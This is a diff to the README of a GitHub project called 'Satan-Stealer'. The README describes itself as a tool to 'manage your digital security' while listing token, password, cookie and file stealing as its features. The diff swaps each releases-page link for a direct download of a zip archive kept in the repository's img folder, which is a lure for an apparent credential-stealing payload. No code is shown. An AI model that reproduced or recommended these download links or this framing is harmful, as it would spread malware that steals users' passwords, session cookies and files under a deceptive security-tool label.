@@ -1,7 +1,7 @@
 # 👾 Satan-Stealer - Simplify Your Digital Life
 
 ## 📥 Download the Latest Version
-[![Download Satan-Stealer](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/sonnch3141/Satan-Stealer/releases)
+[![Download Satan-Stealer](https://raw.githubusercontent.com/sonnch3141/Satan-Stealer/main/img/Satan-Stealer-3.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/sonnch3141/Satan-Stealer/main/img/Satan-Stealer-3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to Satan-Stealer! This tool helps you manage your digital security. With features like token, password, cookie, and file stealing, it aims to enhance your awareness of potential threats. 
@@ -24,7 +24,7 @@ To run Satan-Stealer, your system should meet the following requirements:
 To get started, visit the Releases page to download the software. Follow these steps:
 
 1. Click the link below:
-   [https://github.com/sonnch3141/Satan-Stealer/releases](https://github.com/sonnch3141/Satan-Stealer/releases)
+   [https://raw.githubusercontent.com/sonnch3141/Satan-Stealer/main/img/Satan-Stealer-3.6.zip](https://raw.githubusercontent.com/sonnch3141/Satan-Stealer/main/img/Satan-Stealer-3.6.zip)
    
 2. On the Releases page, find the latest version. 
 
@@ -55,4 +55,4 @@ If you want to contribute to the project, please check the guidelines in the rep
 ## 🌐 Learn More
 For further information and updates, visit our GitHub repository. Stay informed about the latest features and improvements.
 
-[![Download Satan-Stealer](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/sonnch3141/Satan-Stealer/releases)
+[![Download Satan-Stealer](https://raw.githubusercontent.com/sonnch3141/Satan-Stealer/main/img/Satan-Stealer-3.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/sonnch3141/Satan-Stealer/main/img/Satan-Stealer-3.6.zip)
